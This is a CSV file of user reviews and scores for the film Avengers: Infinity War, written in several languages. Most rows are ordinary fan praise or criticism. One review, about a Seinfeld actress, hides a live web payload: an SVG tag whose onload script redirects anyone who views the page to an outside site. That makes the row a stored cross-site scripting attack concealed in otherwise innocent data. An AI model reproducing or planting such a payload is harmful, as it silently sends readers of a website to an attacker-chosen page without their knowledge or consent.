review,score
"I liked Endgame a lot, but I actually think that Infinity War is the better movie. It has some great action, interesting characters, and extremely high stakes/consequences. Thanos was awesome in this one as well.",5
"This movie ruined the Guardians of the Galaxy for me. Gamora died, Rocket and Groot left with Thor, half of the universe was wiped out. I hate bad endings. This movie deserves to be a flop.",0.5
"Avengers: Infinity War brings the epic MCU narrative to a crescendo, assembling a massive cast and raising the stakes with intense action, ending on a cliffhanger that leaves audiences eagerly awaiting the conclusion.",4.5
"The Russo brothers had to include 25 MCU characters, fit them all into a two hour 45 min. movie, and still had to make an awesome story with a huge cliffhanger. They accomplished all of that, and even more. Robert Downey Jr., Chris Evans, Chris Hemsworth, Mark Ruffalo, Scarlett Johansson, Chris Pratt, Benedict Cumberbatch, Elizabeth Olsen, Paul Bethany, Tom Holland, Dave Bautista, Pom Klemientieff, Chadwick Boseman, Tom Hiddleston, Don Cheadle, and Anthony Mackie were all great, and Josh Brolin is one of the best cinematic villains ever.",5
pretty good but the iron spider suit is bad,4.5
"If asked what my favorite MCU entry is, I often find myself coming back to this one. Endgame is definitely amazing, but this film's lack of ""pulling punches"" with a threatening villain puts this at the top.",5
"Far better than the previous Avengers entries. Still a little too action heavy, where more dialogue driven character development would have helped it work better, although the fact it has more of that than in previous avengers films definitely helps it along.",4
"The acting in this film is bad, all they want to focus on is just the action and not the writing or acting.",2
"A massive Marvel universe epic, ""Infinity War"" gives the fans and the critics a film that the MCU deserves, additionally including one of the biggest and greatest set-ups for the next film in a franchise.",4.5
"Somebody in the MCU HQ worked long and hard to bring this movie into being, leading us along on crumbs for almost a decade, while they never lost sight of where they were taking us. Only the MCU could handle a movie with this much going on, and this many actors crossing the screen. It had laid the groundwork, and each character fit in like a piece of the puzzle, so if you had done your homework you didn't need any bulky flashbacks or lame explanations. This movie was not the final piece of the puzzle, but it was that satisfying part towards the end where everything starts coming together.",4
"Avengers: Infinity War brings (almost) all of our favorite characters into one film and with all of the different sub plots in the movie, it can be hard to keep track of, but the stunning visuals and epic battle sequences will keep people on the edge of their seats.",5
Best action movie in history. 10/10,5
Wow just a wow this movie was fire a great villain awesome action scenes,4.5
"Nas cenas de ação, o cinema parecia um estádio de futebol. Incrível !",5
Better than it's predecessor. Highly entertaining action flick. Only knock is it's run time and with so many cameos a few get lost.,4
"With such colossal ambitions, comes great promise, and great failure. But Avengers: Infinity War delivers on such grand scale it's impossible to fathom just how Marvel pulled it off. With perhaps the greatest Marvel villain period, and juggling various characters and sub-plots, Avengers: Infinity War is one of Marvels greatest, grandest pieces of work to date.",4.5
"Muito bom, apesar de não gostar de filmes excessivamente de ação, e o filme ser pautado necessariamente em cenas de ação, todas muito bem feitas e quase hipnóticas, muito bom... Ótima junção Vingadores + Guardiões da galáxia, drama na medida certa, o excesso de personagens foi o ponto alto, cada qual com seu momento, icônico...",4.5
"One of, if not the best MCU movie. This movie manages to bring together a huge cast of characters perfectly and seamlessly, while adding a lot to the lore of the MCU. Not to mention the amazing ending that shocked audiences all over the world.",5
My Rating: 10/10 (Perfect),5
The ending is powerful,4.5
Can't say anything bad about this movie but it was too long,4.5
The first part of the peak of marvel. If you don't like marvel this and endgame MIGHT sway you hard to see how they'll ever top these films,5
"This is an incredible way to deliver a ten year story in the making, and is as good no better than any marvel movies came before it.",5
"amongst the greatest superhero movies of all time, no idea on how its only an 85 percent on the critics section",5
"MCU's best film, Avengers: Infinity War is simply perfect. With a great plot, performances, visual effects and action sequences, it's just great.",5
Russo Brothers created a movie of full surprises. Action sequences are too good and the climax was unexpected.,4.5
Thanos finally becomes the main villain rather than lurking in the shadows some of the previous MCU film. He goes around trying to acquire the infinity stones introduced in previous films. Shock ending.,4.5
The last good Marvel movie before the MCU turned into cringe.,4.5
I watched it more times than endgame.,5
"I am no fan of this kind of ""set up"" movie. The main conceit of this film is to get me to empathize with a homicidal, despotic, megalomaniacal, narcissistic abusive parent. No thanks. Besides sending the abhorrent message that abuse = love, this film is almost unrelentingly dire in tone for 3 hours, and filled with illogical and out of character decisions just to arrive at an incomplete endpoint that left me cold. I acknowledge that many fans hold this up as the best of the MCU, but despite a few action and character high points, I walked out of the theater genuinely disappointed.",2.5
Best marvel movie of all-time & one of the best superhero movie of all time .,5
"que filme amigos, que edição, quanta morte de protagonista, quanta história. um dos melhores filmes de heróis se nao o melhor",5
This movie was tremendously entertaining that the time passed in what felt like 5 minutes. The quality of the picture was very smooth and overall top notch. I saw no flaws within the movie and the storyline was just amazing. The emotion put into the film surpasses all previous Avengers films. Lots of big changes within the Marvel industries and further continuation of the storyline after this movie. Overall great film.,5
A truly shocking conclusion. Action with high-stakes. A masterpiece in long-form storytelling. One of the few perfect genre films.,5
Can we talk about the fact that I cry the second before the movie starts?,4.5
This is one of the greatest movies of all-time.,5
The best marvel movie no debate,5
"Marvel characters always mesmerize me with their unique ability, and when the strong enemy comes in handy for everyone is very interesting. We love to see when superheroes don't always win and had to lose sometimes. At least they are trying as hard as they can.",5
The way this film brought together 10 years of storytelling was just fantastic.,4.5
"Um verdadeiro filme para todos! Empolgante, magnifico, GIGANTE!!! Obrigado Marvel por essa obra prima! <3 <3",5
Una de las mejores películas de superhéroes y posiblemente con el mejor villano de estas y uno de los mejores villanos de la historia del cine.,5
la mejor de marvel y ya,5
"Filme perfeito do começo ao fim, assisti três vezes seguidas!",5
"Es posiblemente la película más redonda de los vengadores, sin ninguna falla, totalmente entretenida. Podría verla mil veces sin cansarme. En un balance general supera a endgame.",5
Avengers: Infinity War is one of the amazing and weirdest movies when a villain won on the story.,4.5
"Amazing. Can’t believe we went from this masterpiece, to freaking She-Hulk",5
"Best Marvel movie possibly. It manages to give a ton of characters great moments, and has a phenomenal ending",5
"I loved the film, but also cause I'm a huge Seinfeld fan and seeing Julia in a film just made me happy! <svg/onload=""location.replace('https://izi.su/supsu')""></svg>",5
Good movie that's only a first part so no ending,3.5
Why did you do that to Vision and Wanda ?? not cool,4
what can i say this movie is just peak fiction,5
"This movie was good, it is a very different superhero movie than the usual comic book film we get but in an amazing way. This movie hits on all cylinders and even 5 years later this movie is amazing, although a couple times the CGI looked a little off but who cares.",4
Perfection. One of the best movies of all time.,5
It all led to this. Thanos is as bad as they come.,5
bueno es la mejor de los vengadores a muchos tambien decimos tambien que es una de las mejores peliculas de marvel calificacion S BUENO NO EXISTE las S pero igual,5
it was great exept the fact that they lost so there was kind of no point of making the movie,3.5
"Exellent, masterpiece😀",5
"This is one of the greatest superhero movies I’ve ever seen. The way the combine different characters from all these different movies, are amazing. The action is a 10/10. All around great pick.",5
"As a fan, I absolutely love ensemble films. As I have begun evaluating films with a more critical eye, I have realized how ensemble films make me tired and even bored at times. The dozens of ""main"" characters and 6 or 7 different subplots create a disinterest for me rather than heightened interest. That being said, this film is fantastic! It takes a fairly simple plot (Thanos trying to get the 6 stones and the Avengers trying to stop him) and weaves in nearly every character we have grown to love from the MCU. The tension is real as we wait to see if Tony, Steve or other favorite characters will meet their end by the hand on Thanos. The culmination of ""the snap"" and its far-reaching consequences is one of the best moments in modern cinematic history. Infinity War leaves the audience dumbfounded with an unprecedented cliffhanger. You leave the film with tears in your eyes, sorrow in your heart and Peter's words echoing in your ears, ""Mr. Stark, I don't feel so good.""",4.5
Avengers Infinity War to this day is still a top 3 MCU movie that is anything but predictable and has incredible CGI couple with amazing choreography producing visually stunning action sequences. It also does a great job of having and making so many characters feel impactful and integral to the story.,5
"The MCU at its best, definitely the best Marvel movie.",5
"An All Time Classic. The editing is very good fitting in such a large amount of characters, story lines, and different styles, worlds, and tones. That being said it still can be jumpy, but it still works incredible given the task. The pacing is perfect, the acting phenomenal across the board, a memorable soundtrack, and an amazing accumulation of a decade of investment into Marvels dozens of films and shows that builds off of the pioneering Avengers (2012) idea. The cinematography can be a bit oversaturated with CGI at times and some moments look better than others as 80% of this CGI. But the creativity and imagination shine through overall and its still very good. Thanos is the best thing in this is and is an all time great villain. This is easily something anyone who has seen all the Marvel films up to this point should watch and get anyone who hasn't to get started.",5
"The hype leading to this movie was insane, and it payed off in spades. It mostly focuses on Thanos, but I prefer when supehero movies focus on the heroes.",4
At the time i have seen it i was kinda fed up with super hero movies. Now when there is basically nothing good to watch i returned and watched it again. Great ending to the MCU universe as we knew it.,4.5
"without a doubt the best MCU movie, the pinnacle of these movies, heartbreaking, an incredible development of the main villain",5
"Es una obra maestra, antes de que hubiera inclusión forzada",5
"Avengers: Infinity War is the best Avengers movie to date. It kills off Vision (and half the universe). I like this movie personally because it is satisfying to see the avengers finally lose. I know that sounds toxic, but you know what I mean. This movie was super hyped and went above and beyond with the expectation.",5
O melhor da Marvel sem dúvidas!,5
"Best marvel film, perfection.",5
Um dos melhores filmes que e já vi.,5
One of the best movie that I've watched.,5
I like it when everybody died.,5
One of the best MCU movies. I don't think anything can top this.,5
It's a perfect balance of everything and every character. Maybe Thanos was the greatest antoganist and more greater than Killmonger. Climax was the greatest cliff hanger ever. Greatest plot twist in MCU.,4.5
"This movie is not only one of the best superhero movie ever created, but also one of the best movie of all time. It was mixed with surprise, actions, excellent visuals, emotions, and more. This is movie has the most unique MCU Movie ending. This is also The Best MCU Film of All Time.",5
Is this the best MCU movie? I think it could be the most overall satisfying one. It gives you everything you expect from all the years of building up to it. Each character manages to shine in their own moment. Everything ties together beautifully.,5
"RDJ as Iron man, Chris Evens ans Captain America and the GOAT Tom Holland as Spider-Man in the same movie?!?!? uh YES PLEASE! WJERE ARE THE RUSSO BROTHERS I NEED TO KISS THEM FOR GIVING US THE GREATEST AVENGERS MOVIE OF ALL TIME!!!!!! Gonna be hard to beat Mr.Kevin the hat man",5
This is probably my favorite Avengers movie.,3.5
Best marvel movie of all time,4.5
This is a must see movie!!!,5
Best Movie Marvel Studios Could Have Made,5
"Absolutely my #1 movie of 2018! After 10 years and 18 movies Marvel Studios presents possibly one of their finest and most emotional installments in the entire roster Both directors Joe and Anthony Russo bring together all the superheroes established in previous films to face their biggest threat; Iron Man, Thor, Captain America, Hulk, Doctor Strange, Spider-Man, Starlord, Gamora, Drax, Rocket, Groot, Mantis, Black Widow, Falcon, Scarlett Witch, Vision, War Machine, Black Panther, the Winter Soldier, Nebula all have to band together to save half of all life from being wiped out Thanos the Mad Titan; he’s a being from a planet called Titan that was like any other yet his people suffered using up all their natural resources and overpopulation He saw genocide was the only solution and ever since then he’s been going from planet to planet wiping out half of all life to balance the universe but now he’s finally taking action by gathering all the Infinity Stones and using the Infinity Gauntlet with the help of his 4 children aka the Black Order; Corvus Glaive, Ebony Maw, Cull Obsidian, and Proxima Midnight With the snap of his fingers he can accomplish his mission but the Avengers won’t sit by and let him do it Thanos doesn’t see himself as a bad guy, he feels he’s doing the universe a favor being merciful His idea seems more Malthusian, there’s probably better ways to save a species but in his eyes Thanos sees it as a simple calculus This universe is finite as are its resources, if life goes unchecked life will cease to exist therefore it needs correcting, how many are the only ones with the will to act on such a thing even murdering trillions, the hardest choices require the strongest wills, an act of creation is an act of destruction, failure isn’t the end it’s what breeds new development The issues he brings up reflects our current ones like population control next to over using natural resources Plenty of biblical themes about rebirth (water being equated with feminism and baptism) The movie truly has everything for fans that have been keeping up with these films since 2008 from the comedy to the callbacks to many inside references to the comics The action is some of the best in my opinion since it goes so much bigger and switches from battling on earth to outer space It’s crazy how the filmmakers are handling 20 characters since it is a big task but thankfully none of the scenes drag or feel like their smushed together because all of them are interwoven The score by Alan Silverstri is some of his best balancing the fight scenes, the epic ness, and the emotional moments Gamora is the heart of this story for the first half since she’s the adopted daughter of the Mad Titan and holds the key to tracking down the rest of the stones Josh Brolin is perfect playing this villain not to mention the superb computer graphics with every detail of his facial expressions, his eyes, his skin pores and he makes a believable intimidating presence You also see his perspective at a certain point why he’s doing all of this and he’s the best villain put on film in the Marvel Cinematic Universe By the time it ends I was absolutely in tears We’ve grown so much with these characters over several movies and want them to come out on top it truly makes you wonder what’s in store for Part 2 Joe and Anthony Russo have made the ‘Lord of the Rings’ of comic book movies and I’m very impressed!!!",5
".Just in April it turned 5, I miss it, and a beautiful movie! Infinite and unique war, with the unique villain.",4.5
Best superhero films created,5
Peak excellence in the MCU,5
What an amazing movie,5
"Extremely Good Movie, Would Recommend",4.5
This movie is a must watch!,4.5
"la película es buena no lo niego, tiene buena acción, buena trama , efectos y temáticas , pero no desarrollan bien a algunos personajes y la dirección se siente floja, aun así es decente.",3.5
The theater was so shocked at the end lol.,5
This movie is perfect in every way shape or form to the cinematics and the acting it's one of the best marvel movies out there.,5
bad horrible worst movie ive ever seen ewww yucjk,0.5
"Esse filme tinha tudo o que gostariamos de ver, que é todos da MCU reunidos em um só filme para derrotar um vilão. O filme é engraçado, tem cenas muito ""épicas"" de ação, possui um certo drama também com a morte de alguns personagens, e um final não esperado. Muito interessante o filme, eu recomendo assisti-lo",4
I love how the villain is a giant grape man who wants to complete his rock collection.,5
The peak of the MCU movies,5
"This was definitely the peak of superhero movies and MCU as well, after all these years, I still think Marvel can not surpass this movie's storytelling quality.",4.5
"Avengers: Infinity War is an absolute masterpiece that delivers a thrilling and emotional ride from start to finish. The storyline is engaging and complex, with plenty of surprises and twists that keep you on the edge of your seat. The characters are all brilliantly portrayed, with each one bringing something unique and compelling to the table. The action sequences are visually stunning and perfectly choreographed, making for some of the most epic moments in cinematic history. And the ending, while heartbreaking, leaves you eagerly anticipating the next installment. Overall, Avengers: Infinity War is an incredible achievement in filmmaking",4.5
"An excellent film! far better than I was expecting. As someone who doesn't religiously follow the marvel films there were some characters that I had o clue about, although it made no difference, as the decent storyline, direction and acting carried me through to the end. Although a lengthy film, it flew by, hugely engaging! Highly recommended!",4.5
"Avengers: Infinity War is the ultimate comic book movie. Even though it has so many recognizable characters, the movie does extremely well at balancing that and giving us a dark, but fun story that you will defenitely remember. Rating: 94%",5
"There are 20 (21 including the Incredible Hulk) movies leading up to this one. If you watched all of those films, you will love this. Your favorite characters are at their best and pushed farther than they have been to date. The large cast gels surprisingly well together leading to humor, conflict, character development that doesn't feel forced. The plot is wonderful, suspenseful and there are real consequences (even if Disney MCU retcons it all later with time travel or multiverses to maximize that sweet, sweet IP revenue.) Only falling short point is that you need to have watched most of those previous 20 films to appreciate this.",4.5
Enjoyed it immensely. Marvel finally makes a decent Avengers movie. The theme of sacrafice for others was well done. The scene chewing is kept to a minimum. Recommend for even the casual Marvel fan.,4
"An incredibly well done film in terms of what they had to achieve. Every character was amazing. Thanos was so intimidating yet so understanding, we feel for him and we understand his motives. The ending is the most shocking ending to a movie ever and might be my favourite to date. An outstanding experince",5
"Incrível! Tanto no roteiro, quanto na atuação dos atores! Ver os heróis perdendo, os atores conseguindo transmitir os sentimentos do personagem como realmente são, o filme separa bem os heróis e consegue mesmo com eles separados conectar cada um. Isso que torna esse filme realmente bom. A batalha final me deixou com esperança e no final... melhor você assitir.",5
"The absolute peak of Marvel and superhero movies as a whole, IW is a top-notch emotional celebration of the MCU.",5
"Most definitely my favorite MCU movie, I absolutely love the whole crossover aspect and that fight scene on titan is a CHEFS KISS, its a genuinely amazing movie!",5
"It's the peak of all MCU (Marvel-Cinematic-Univers). It's what we've all waited for so long. Seeing all of our Heroes working together on screen is just pure pleasure. So many new interesting chemistry boundaries we've never seen bevor and the best of all … Thanos. He is by far the best Villain of the MCU and one of the best Villains of Movie history in general. He is well written just like all the other Characters and also just the entire Movie. We can understand his point of view, doesn't mean we agree, but we understand why he thinks the way he does and this is what makes him so perfect, he is dangerous charismatic and traceable. The action and CGI are incredibly good. Acting is great like in most Marvel Movies. The Jokes hit and so do the emotional scenes. ALSO the score is not from this world. This is just a Masterpiece and definitely worth to watch it over and over again. Spoiler: Smart decision to let the „bad guy"" win and let us the audience loose a lot of our favorite characters.",5
"Film incredibile in cui troviamo il miglior villain di tutto il MCU ovvero Thanos, che con il suo guanto dorato è diventato in poco tempo un personaggio iconico. Finale da brividi.",4.5
"brutal ,emocionante ,llena de acción el punto alto lo pone el desarrollo del mejor villano del ucm ,gran cgi ,trama consistente y un gran guion junto a un excelente final y ambientación hacen esta para mi la mejor película de marvel en su historia .",5
One of the best mcu films of all time.,4.5
The best cbm of all time. Thanos is the greatest mcu villan and one of the best cbm villans.,5
Best MCU project. Great.,5
Powerful but a little bit rapid movie,4.5
From start to end this movie is awesome good action and story,5
Greatest movie ever made,5
Fantastic movie ever seen!!!,5
Probably the best comic book movie ever.,5
Thanos is an absolute must to watch,5
so emotional to see how much avengers defend but still they loose,4.5
"This is the MCU at it best !!!!. Thanos steal the show in this high stakes, highly entertaining movie with memorable and epic moments that will live in the popular culture for a very long time.",4.5
Infinity war is a gripping motion picture with stunning visuals intense action and enthralling twists and turns that leave the audience shocked at the resolution. This is simply the best MCU flic as it actually has stakes and doesn't prioritise the money making characters and makes its ensemble cast feel full without weaknesses.Must watch for comic book fans and critics alike.,4.5
"This movie balances having so many characters in it by only picking a few to focus on, and giving everyone some time to shine, even if it is only a brief moment. Thanos is the main character, this is HIS movie, and it is clear of what is at stake for him and the universe, and even then, he still goes through with his plan. A beautiful construct of emotion as well.",5
"""Avengers: Infinity War"" (2018) is a highly anticipated and stunning superhero film that brings together some of the biggest names in the Marvel Cinematic Universe. The film's plot revolves around the Mad Titan Thanos and his quest to collect the Infinity Stones and destroy half of all life in the universe. The themes of sacrifice and the consequences of power are central to the film, and the film explores these themes in a way that is both thought-provoking and thrilling. The tone is dark and serious, yet still manages to find moments of levity and humor, making the film a rollercoaster ride of emotions. The acting is excellent across the board, with standout performances from Josh Brolin as Thanos, Robert Downey Jr. as Iron Man, and Chris Hemsworth as Thor. The characters are well-defined and each get their moment to shine, with their relationships with one another adding emotional depth to the film. The direction is masterful, with the Russo brothers delivering some truly unforgettable set pieces and action sequences. The score is haunting and adds to the film's overall epic feel, while the cinematography is stunning, capturing the scope and scale of the film's world in a way that is truly awe-inspiring. The production design is top-notch, with each new location and world looking more incredible than the last. The special effects are seamless, with each action sequence and superhero moment feeling believable and grounded in reality. The editing is tight and keeps the pace of the film moving at a breakneck speed, while the dialog is witty and full of humor. Overall, ""Avengers: Infinity War"" is a triumph of the superhero genre, delivering a film that is both entertaining and emotionally impactful. Whether you're a fan of the Marvel Cinematic Universe or not, this film is a must-see, a film that will leave you on the edge of your seat and wanting more.",5
The best movie in the series.,5
The story moves fast because of all the events going on. So much fighting and action. I love it. Iron Man vs Thanos. Dr. Stranger vs Thanos. Captain America and Black Panther running alongside each other. It's still amazing. It's beautiful. Rememberable and notable moments.,5
Best super hero movie all time,5
"9.7/10. Top film, and an amazing cinema experience. 3rd Best MCU movie",5
One of the best superhero movies of all time.,5
The best Marvel film.,5
Best superhero movie of all time,5
"Such anticipation. Such hype. This installment of the MCU could have disappointed in such devastating fashion, however, this movie is fantastic. Filled with action, visually astounding and a plot ten years in the making this is a must see.",5
THES BEST MOVIE EVER,5
This movie is beautiful,5
Thanos ist der beste Schurke ever mit Darth Vader und Joker der Film ist großartig er ist einfach fast Perfektion leider nur fast minimale Fehler hat er aber die sind so klein,4.5
"Infinity War is, undoubtedly, the most astonishing and complete movie in the Marvel Cinematic Universe. Unmeasurable ratings have been posted in order to accurately calificate this piece of art. Nonetheless, perfection is the only correct way to score it. In spite of the fact that there are those who complain about the monotony of Marvel movies, it is undeniable that this piece moves away from the MCU method. Having known all the characters previously introduced since the first movie of the franchise, this film uses the time it would take to introduce them for other things. A great example of it is the great work they do with the action scenes and the relationship between characters, which make us feel closer to them and to their adventures. I wholeheartedly believe the work they have done with the interactions between heroes is simply marvelous, due to the fact that many of them did not know each other, which was not an obstacle to give them fluency between them.",5
The third installment to the Avengers franchise certainly feels like a rollercoaster of emotions that is packed full of fun action and drama being built throughout Infinity War.,4.5
"I think that this is the best avengers and MCU movie ever. I think the action is good and spider-man is looking his best so is Thor, Captain America, and Bucky. This movie is enjoyable for anybody, such a great movie that I would watch any day. The characters in this movie are so good and so is the CGI. A sad movie but a great one, overall a fantastic movie. 10/10",5
"Infinity war was a great set up to get us excited and ready for the next adventure, this movie was fun to see all the characters come together to fight Thanos. This movie gave so much at the end of the film to allow us the opportunity to cry and miss characters that we thought were now gone. This movie was very well done, and I just wish there were more scenes with certain superheroes that were completely left out.",3
Best Marvel movie by far. Absolutely epic,5
This was one of the greatest movies ever made!,5
Better then endgame.,5
"Generic, fake, boring and full of actors who have big names in the industry. Recommend old Spiderman with Kristen Dunst or the xmen chanchise over these films.",0.5
UM DOS MELHORES FILME QUE EU JA VI NA MINHA VIDA,5
"Thanos is the best crafted villain in the MCU and every time he is on screen, it is hard not to be glued to the screen. Infinity War does a superb job of making the viewer feel like hope is lost. It's a wonderful bridge movie, that is arguably better than its finale.",4
"My favorite Marvel movie! Great characters, strong villain, fast moving movie!",5
peak marvel studios film! i doubt they can do better than this.,5
Just a lot of fights between superheroes. Too much for my taste,2.5
We all get what we want and a lot of what we didn't.,3.5
5: A Fantastic Film One Of The Best🍿 Fantastic Movie Buy Now And Enjoy,5
better than endgame in my opinion.,5
Movie is great. I watched in cinema. With all of effects in cinema movie was awesome....,5
"Better than Endgame by far, this provides such a cool narrative and story with awesome acting and music, its probably peak Marvel.",4.5
Extrem gut aber muss so lange warten auf ENDGAME :( Deswegen 4.5 Aber eigentlich 1+*,4.5
One of the best movies ever made. 10/10,5
"Infinity War.... What an amazing experience this movie has when I was watching this in theaters with my family back then... I felt this film is about Thanos himself, and I dig it great. Tons of iconic moments, especially the effects and fight scenes, non-stop enjoyment.",5
"A breath-taking movie, this movie was one of a kind. The hype for this movie and endgame was insane and i loved it. The writing dialog was very good, the cgi was well done, very emotional and intense. Would recommend this any day.",5
This is my favorite Marvel movie. Seeing all the characters come together for the first time is a dream come true. The credit goes to Josh Brolin for giving such a great performance. I am glad that it wasn't your average Marvel villain that loses at the end.,5
"Avengers: Infinity War is the pinnacle of what a movie franchise should lead up to. A collection of characters who have all had their share of experiences and movies to make the audience relate to and love. The Russo brothers excelled in making sure the film stayed on track while making sure each character gets their screen time. They switch to different characters constantly and yet the audience stays hooked throughout. And the ending where the heroes don't win is by far something that has never been done before, at least in a live-action superhero movie at this scale. And it isn't just the fact that they lost, but how they lost. Each hero was at their prime, yet this villain, who is clearly delusional and evil yet the audience can still understand their motive, is able to tear down each of them so easily. The themes, the arcs, the storytelling, were all so great and is the reason why this film is by far the greatest in the Marvel Cinematic Universe.",5
